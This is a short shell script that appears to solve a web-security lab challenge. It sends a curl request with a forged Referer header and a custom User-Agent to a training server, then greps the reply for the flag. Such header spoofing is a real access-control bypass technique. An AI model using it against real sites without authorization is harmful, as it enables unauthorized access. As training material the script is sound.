# /bin/sh

if [ -z "$1" ]; then
	echo "Usage: sh getflag.sh [server_ip]";
	exit 1;
fi

curl -s -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" \
http://$1/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c \
| grep "flag"
